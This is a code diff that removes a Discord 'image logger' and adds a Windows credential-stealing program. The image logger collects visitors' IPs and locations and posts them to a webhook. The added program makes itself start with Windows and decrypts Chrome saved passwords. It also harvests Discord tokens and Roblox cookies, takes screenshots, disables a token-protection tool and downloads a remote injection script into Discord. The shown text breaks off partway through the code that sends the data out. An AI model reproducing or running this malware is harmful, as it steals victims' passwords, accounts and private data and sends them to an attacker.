@@ -1,408 +1,594 @@
-# Image Logger
-# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
-
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
-
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "C00lB0i"
-
-config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
-    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
-    },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
-    "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
-    },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
-}
-
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
-
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
-
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
-        return
-    
-    bot = botCheck(ip, useragent)
-    
-    if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
-        return
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
-        
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
-
-        if config["antiBot"] == 3:
-                return
-
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-                ping = ""
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-    }
-  ],
-}
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
-}
-
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
-    def handleRequest(self):
-        try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
-
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
-            
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
-            
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
-            
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-handler = app = ImageLoggerAPI
-
 import requests
 import os
-import time
+import sys
+import json
+import base64
+import winreg
+import shutil
+import psutil
+import random
+import zipfile
+import socket
+import sqlite3
+import platform
+import win32crypt
+import subprocess
+import httpx
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+from Cryptodome.Cipher import AES
+from subprocess import PIPE, Popen
+from win32crypt import CryptUnprotectData
+from PIL import ImageGrab
+from json import load
+from sys import argv
+from base64 import b64decode
+from threading import Thread
+from re import findall, match
+from urllib.request import urlopen
+from discord_webhook import DiscordWebhook, DiscordEmbed
+from getmac import get_mac_address as gma
 
-def display_title():
-    print('\u001b[36m' + '=' * 60 + '\u001b[0m')
-    print('\u001b[36m| \u001b[37mDiscord Token 2fa/non-2fa Fetcher \u001b[36m|\u001b[0m github.com/RealRahan')
-    print('\u001b[36m' + '=' * 60 + '\u001b[0m')
-    print()
+weblink = "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"
+#The injection Was Mad By Rdimo#6969
+injection = "YES_NO"
 
-def get_headers():
-    return {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjQ5MDA1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
-        'X-Discord-Locale': 'en-US',
-        'X-Debug-Options': 'bugReporterEnabled',
-        'Origin': 'https://discord.com',
-        'Referer': 'https://discord.com/login'
-    }
+location = os.environ["appdata"] + "\\system32.exe"
+if not os.path.exists(location):
+    shutil.copyfile(sys.executable, location)
+    subprocess.call('reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Grabber /t REG_SZ /d "' + location + '"', shell=True)
 
-def login(email, password):
-    session = requests.Session()  # Use session to maintain cookies
-    headers = get_headers()
-    data = {'login': email, 'password': password, 'undelete': False}
+
+class spyware:
+    ip = ""
+    current_user = ""
+
+    def __init__(self):
+        self.ip = ""
+        self.current_user = ""
     
-    # Initial login request
-    r = session.post('https://discord.com/api/v9/auth/login', json=data, headers=headers)
-
-    if r.status_code == 200 and r.json().get('mfa', False):
-        ticket = r.json().get('ticket')
-        if not ticket:
-            print('\u001b[31m>\u001b[37m Error: No 2FA ticket received\u001b[0m')
-            return
-
-        print('\u001b[33m>\u001b[37m 2FA Required - Check your authenticator app\u001b[0m')
+    def fetch_encryption_key(self):
+        local_computer_directory_path = os.path.join(
+        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
+        "User Data", "Local State")
         
-        # Get code with timeout
-        code = input('\u001b[33m>\u001b[37m Enter 6-digit 2FA code: \u001b[0m').strip()
+        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+            local_state_data = f.read()
+            local_state_data = json.loads(local_state_data)
+    
+        encryption_key = base64.b64decode(
+        local_state_data["os_crypt"]["encrypted_key"])
+        encryption_key = encryption_key[5:]
         
-        # Prepare MFA data with proper formatting
-        mfa_data = {
-            'code': code,
-            'ticket': ticket,
-            'login_source': None,
-            'gift_code_sku_id': None
+        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
+   
+    def decrypt_passwords(self, password, encryption_key):
+        try:
+            iv = password[3:15]
+            password = password[15:]
+                        
+            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)            
+            return cipher.decrypt(password)[:-16].decode()
+        except:    
+            try:
+                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+            except:
+                return "No Passwords"
+
+    def get_passwords(self):
+        final_ans = "\nChrome Passwords:\n"
+        key = self.fetch_encryption_key()
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "default", "Login Data")
+        
+        filename = "ChromePasswords.db"
+        shutil.copyfile(db_path, filename)        
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+                
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+            "order by date_last_used")
+        
+        for row in cursor.fetchall():
+            main_url = row[0]
+            login_url = row[1]
+            username = row[2]
+            password = self.decrypt_passwords(row[3], key)
+            
+            if username or password:                                    
+                final_ans += f"Main URL: {main_url}\n"
+                final_ans += f"Login URL: {login_url}\n"
+                final_ans += f"Username: {username}\n"
+                final_ans += f"Password: {password}\n\n"
+            else:
+                continue
+
+            final_ans += "=" * 80 + "\n\n"
+
+        cursor.close()
+        db.close()
+        
+        try:            
+            os.remove(filename)
+        except:
+            pass
+
+        return final_ans
+
+    def get_system_info(self):
+        final_str = "\nSystem Information:\n"
+        
+        data_dictionary = {"IP-Address" : "", "Hostname" : "", "Platform:" : "", "Release-Data" : "", "Version" : "", "Processor" : "", "Architecture" : "", "Ram" : ""}
+        data_dictionary["Platform:"] = platform.system()
+        data_dictionary["Release-Data"] = platform.release()
+        data_dictionary["Version"] = platform.version()
+        data_dictionary["Architecture"] = platform.machine()
+        data_dictionary["Hostname"] = socket.gethostname()
+        data_dictionary["IP-Address"] = socket.gethostbyname(socket.gethostname())
+        data_dictionary["Processor"] = platform.processor()
+        data_dictionary["Ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3))) +" GB"
+        
+        self.ip = data_dictionary["IP-Address"]
+        for key, value in data_dictionary.items():
+            final_str += "{}: {}\n".format(key, value)            
+
+        return final_str
+
+    def get_info(self):
+        system_info = "THUNDER GRABBER MADE BY TWISTX7#9122 | https://github.com/TWIST-X7"
+        try:
+            system_info += self.get_system_info()
+            system_info += self.get_passwords()
+
+            return system_info
+        except Exception:
+            pass
+  
+  
+    
+        
+class grabber:
+    
+    def __init__(self):
+
+        self.baseurl = "https://discord.com/api/v9/users/@me"
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
+        self.tokens = []
+        self.robloxcookies = []
+        self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+        self.sep = os.sep
+        
+        #Thread(target=self.killDiscord).start()
+        self.bypassTokenProtector()
+        self.grabTokens()
+        Thread(target=self.screenshot).start()
+        self.grabRobloxCookie()
+        #self.killDiscord()
+        if injection == "y":
+            self.injector()
+        else:
+            pass
+        self.SendInfo()
+        
+    
+    def getheaders(self, token=None, content_type="application/json"):
+        headers = {
+            "Content-Type": content_type,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+        }
+        if token:
+            headers.update({"Authorization": token})
+        return headers
+    def killDiscord(self):
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in
+                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+                try:
+                    proc.kill()
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+    
+    def get_master_key(self, path):
+        with open(path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+        local_state = json.loads(local_state)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    
+    
+    
+    def injector(self):
+        for _dir in os.listdir(self.appdata):
+            if 'discord' in _dir.lower():
+                discord = self.appdata+self.sep+_dir
+                disc_sep = discord+self.sep
+                for __dir in os.listdir(os.path.abspath(discord)):
+                    if match(r'app-(\d*\.\d*)*', __dir):
+                        app = os.path.abspath(disc_sep+__dir)
+                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
+                        if os.path.exists(inj_path):
+                            if self.startup not in argv[0]:
+                                try:
+                                    os.makedirs(
+                                        inj_path+'initiation', exist_ok=True)
+                                except PermissionError:
+                                    pass
+                            f = httpx.get('https://raw.githubusercontent.com/TWIST-X7/Injection/main/Injection-clean.js').text.replace(
+                                "%WEBHOOK%", weblink)
+                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                indexFile.write(f)
+                            os.startfile(app + self.sep + _dir + '.exe')
+                        
+    def killDiscord(self):
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in\
+            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+                try:
+                    proc.kill()
+                except psutil.NoSuchProcess:
+                    pass
+    
+    def bypassTokenProtector(self):
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
+        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+            try:
+                os.remove(tp+i)
+            except Exception:
+                pass 
+        try:
+            with open(config) as f:
+                item = json.load(f)
+                item['auto_start'] = False
+                item['auto_start_discord'] = False
+                item['integrity'] = False
+                item['integrity_allowbetterdiscord'] = False
+                item['integrity_checkexecutable'] = False
+                item['integrity_checkhash'] = False
+                item['integrity_checkmodule'] = False
+                item['integrity_checkscripts'] = False
+                item['integrity_checkresource'] = False
+                item['integrity_redownloadhashes'] = False
+                item['iterations_iv'] = 364
+                item['iterations_key'] = 457
+                item['version'] = 69420
+
+            with open(config, 'w') as f:
+                json.dump(item, f, indent=2, sort_keys=True)
+
+
+        except Exception:
+            pass
+    
+    def decrypt_payload(self, cipher, payload):
+        return cipher.decrypt(payload)
+    
+    def generate_cipher(self, aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
+    
+    def decrypt_password(self, buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = self.generate_cipher(master_key, iv)
+            decrypted_pass = self.decrypt_payload(cipher, payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception:
+            return "Failed to decrypt password"
+        
+                  
+    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+        def strToInt(x):
+            if isinstance(x, str):
+                return ord(x)
+            return x
+        chars = 'BCDFGHJKMPQRTVWXY2346789'
+        wkey = ''
+        offset = 52
+        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
+        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
+        key = list(val)
+
+        for i in range(24,-1, -1):
+            temp = 0
+            for j in range(14,-1,-1):
+                temp *= 256
+                try:
+                    temp += strToInt(key[j+ offset])
+                except IndexError:
+                    return [productName, ""]
+                if temp / 24 <= 255:
+                    key[j+ offset] = temp/24
+                else:
+                    key[j+ offset] = 255
+                temp = int(temp % 24)
+            wkey = chars[temp] + wkey
+        for i in range(5,len(wkey),6):
+            wkey = wkey[:i] + '-' + wkey[i:]
+        return [productName, wkey]
+        
+    def grabTokens(self):
+        paths = {
+            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
         
-        # Additional headers that might be needed for MFA
-        mfa_headers = headers.copy()
-        mfa_headers.update({
-            'X-Discord-Timezone': 'America/New_York',
-            'Accept': '*/*',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty'
-        })
-        
-        mfa_r = session.post('https://discord.com/api/v9/auth/mfa/totp', 
-                           json=mfa_data, 
-                           headers=mfa_headers)
-        
-        if mfa_r.status_code == 200:
-            token = mfa_r.json().get('token')
-            if token:
-                print(f'\u001b[32m>\u001b[37m Token: {token}\u001b[0m')
-                print('\n\u001b[32m>\u001b[37m Login successful!\u001b[0m')
+        for name, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            disc = name.replace(" ", "").lower()
+            if "cord" in path:
+                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
+                    for file_name in os.listdir(path):
+                        if file_name[-3:] not in ["log", "ldb"]:
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = self.decrypt_password(b64decode(
+                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
+                                try:
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                except Exception:
+                                    pass
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
             else:
-                print('\u001b[31m>\u001b[37m Error: Token missing in 2FA response\u001b[0m')
-                print(f'Response: {mfa_r.text}')
-        else:
-            print(f'\u001b[31m>\u001b[37m 2FA verification failed (Status: {mfa_r.status_code})\u001b[0m')
-            print(f'Response: {mfa_r.text}')
-    
-    elif r.status_code == 200:
-        token = r.json().get('token')
-        if token:
-            print(f'\u001b[32m>\u001b[37m Token: {token}\u001b[0m')
-            print('\n\u001b[32m>\u001b[37m Login successful!\u001b[0m')
-        else:
-            print('\u001b[31m>\u001b[37m Error: No token in response\u001b[0m')
-    
-    elif "PASSWORD_DOES_NOT_MATCH" in r.text:
-        print('\u001b[31m>\u001b[37m Incorrect password\u001b[0m')
-    
-    elif "captcha-required" in r.text:
-        print('\u001b[31m>\u001b[37m Discord gave us captcha. Try again later\u001b[0m')
-        print(f'Response: {r.text}')
-    
-    else:
-        print(f'\u001b[31m>\u001b[37m Login failed (Status: {r.status_code})\u001b[0m')
-        print(f'Response: {r.text}')
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(self.regex, line):
+                            try:
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            except Exception:
+                                pass
+                            if r.status_code == 200 and token not in self.tokens:
+                                self.tokens.append(token)
 
-if __name__ == "__main__":
-    clear_screen()
-    display_title()
-    email = input('\u001b[36m>\u001b[37m Email: \u001b[0m').strip()
-    password = input('\u001b[36m>\u001b[37m Password: \u001b[0m').strip()
-    login(email, password)
-    input('\n\u001b[37mPress Enter to exit...\u001b[0m')
+        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(self.regex, line):
+                            try:
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            except Exception:
+                                pass
+                            if r.status_code == 200 and token not in self.tokens:
+                                self.tokens.append(token)
+
+                                    
+    def screenshot(self):
+        image = ImageGrab.grab(
+            bbox=None, 
+            include_layered_windows=False, 
+            all_screens=False, 
+            xdisplay=None
+        )
+        tempfolder = os.getenv("temp")+"\\Thunder"
+        try:
+            os.mkdir(os.path.join(tempfolder))
+        except Exception:
+            pass
+        image.save(f'{tempfolder}\\Screenshot.png')
+        image.close()
+        
+    def grabRobloxCookie(self):
+        tempfolder = os.getenv("temp")+"\\Thunder"
+        def subproc(path):
+            try:
+                return subprocess.check_output(
+                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
+                    creationflags=0x08000000).decode().rstrip()
+            except Exception:
+                return None
+        try:
+            reg_cookie = subproc(r'HKLM')
+            if not reg_cookie:
+                reg_cookie = subproc(r'HKCU')
+            if reg_cookie:
+                self.robloxcookies.append(reg_cookie)
+            if self.robloxcookies:
+                with open(f"{tempfolder}\\Roblox.txt", "w") as f6:
+                    for i in self.robloxcookies:
+                        f6.write(i+'\n')
+        except :
+            with open(f"{tempfolder}\\Roblox.txt", "w") as f9:
+                        f9.write("No Roblox cookies found")
+              
+    def SendInfo(self):
+        if self.tokens == None:
+            pass
+        else:    
+            for token in self.tokens:                     
+                headers = {
